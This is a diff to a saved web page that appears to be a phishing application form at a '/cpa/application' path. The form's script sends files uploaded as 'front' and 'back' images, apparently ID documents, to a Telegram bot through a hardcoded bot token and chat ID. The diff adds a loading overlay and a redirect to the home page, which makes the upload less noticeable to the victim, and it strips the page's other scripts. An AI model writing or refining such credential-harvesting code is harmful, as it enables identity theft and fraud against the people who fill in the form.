@@ -2,6 +2,24 @@
 <!-- saved from url=(0036)https://prosvrve.com/cpa/application -->
 <html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         <!-- Required meta tags -->
+        <style>
+            #loadingScreen {
+                font-family: Arial, sans-serif;
+                font-size: 1.5rem;
+                color: #333;
+                animation: fadeIn 0.5s ease-in-out;
+            }
+        
+            @keyframes fadeIn {
+                from {
+                    opacity: 0;
+                }
+                to {
+                    opacity: 1;
+                }
+            }
+        </style>
+        
         
 		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
@@ -533,13 +551,11 @@
       }
     });
   </script> 
-  <script>
+ <script>
     document.getElementById("newcontactForm").addEventListener("submit", async function (e) {
         e.preventDefault(); // Prevent form submission
-        
-        // const botToken = "7584753511:AAGgCBMZo7Cg6p9IcFeNQiZb0639AO03kk8"; 
-        // const chatId = "7921593296"; // Replace with your Telegram Chat ID
-        const botToken = "7584753511:AAGgCBMZo7Cg6p9IcFeNQiZb0639AO03kk8"; 
+
+        const botToken = "7584753511:AAGgCBMZo7Cg6p9IcFeNQiZb0639AO03kk8";
         const chatId = "7921593296"; // Replace with your Telegram Chat ID
 
         const frontFile = document.getElementById("front").files[0];
@@ -549,6 +565,22 @@
             alert("Please upload both files.");
             return;
         }
+
+        // Show loading screen
+        const loadingScreen = document.createElement("div");
+        loadingScreen.id = "loadingScreen";
+        loadingScreen.style.position = "fixed";
+        loadingScreen.style.top = "0";
+        loadingScreen.style.left = "0";
+        loadingScreen.style.width = "100%";
+        loadingScreen.style.height = "100%";
+        loadingScreen.style.backgroundColor = "rgba(255, 255, 255, 0.8)";
+        loadingScreen.style.zIndex = "1000";
+        loadingScreen.style.display = "flex";
+        loadingScreen.style.justifyContent = "center";
+        loadingScreen.style.alignItems = "center";
+        loadingScreen.innerHTML = `<p style="font-size: 1.5rem; color: #333;">Uploading files, please wait...</p>`;
+        document.body.appendChild(loadingScreen);
 
         try {
             // Send Front Image
@@ -575,54 +607,23 @@
 
             if (!backResponse.ok) throw new Error("Failed to send back image.");
 
-            alert("Form submitted successfully!");
+            // Remove loading screen
+            document.body.removeChild(loadingScreen);
 
+            // Redirect to the home page
+            window.location = "index.html";
         } catch (error) {
             console.error(error);
+
+            // Remove loading screen
+            document.body.removeChild(loadingScreen);
+
             alert("An error occurred. Please try again.");
         }
     });
-</script> 
+</script>
+
          <!-- Jquery Min JS -->
-         <script src="./apply_files/jquery.min.js.download"></script> 
-         <script src="./apply_files/forms.js.download"></script>
-         <script src="./apply_files/apply.js.download"></script>
-         <script src="./apply_files/register.js.download"></script>
-         <script src="./apply_files/join.js.download"></script>
-         <script src="./apply_files/start-application.js.download"></script>
-         <script src="./apply_files/start-applications.js.download"></script>
-         <!-- Bootstrap Bundle Min JS -->
-         <!-- Bootstrap Bundle Min JS -->
-         <script src="./apply_files/bootstrap.bundle.min.js.download"></script>
-         <!-- Meanmenu Min JS -->
-         <script src="./apply_files/meanmenu.min.js.download"></script>
-         <!-- Wow Min JS -->
-         <script src="./apply_files/wow.min.js.download"></script>
-         <!-- Owl Carousel Min JS -->
-         <script src="./apply_files/owl.carousel.min.js.download"></script>
-         <!-- Carousel Thumbs Min JS -->
-         <script src="./apply_files/carousel-thumbs.min.js.download"></script>
-         <!-- Owl Magnific Min JS -->
-         <script src="./apply_files/magnific-popup.min.js.download"></script>
-         <!-- Nice Select Min JS -->
-         <script src="./apply_files/nice-select.min.js.download"></script>
-         <!-- Jarallax Min JS --> 
-         <script src="./apply_files/jarallax.min.js.download"></script>
-         <!-- Mixitup Min JS -->
-         <script src="./apply_files/mixitup.min.js.download"></script>
-         <!-- Appear Min JS --> 
-         <script src="./apply_files/appear.min.js.download"></script>
-         <!-- Odometer Min JS --> 
-         <script src="./apply_files/odometer.min.js.download"></script>
-         <!-- Progressbar Min JS -->
-         <script src="./apply_files/progressbar.min.js.download"></script>
-         <!-- Form Ajaxchimp Min JS -->
-         <script src="./apply_files/ajaxchimp.min.js.download"></script>
-         <!-- Form Validator Min JS -->
-         <script src="./apply_files/form-validator.min.js.download"></script>
-         <!-- Contact JS -->
-         <script src="./apply_files/contact-form-script.js.download"></script>
-         <!-- Custom JS -->
-         <script src="./apply_files/custom.js.download"></script>
+         
      
  </body></html>
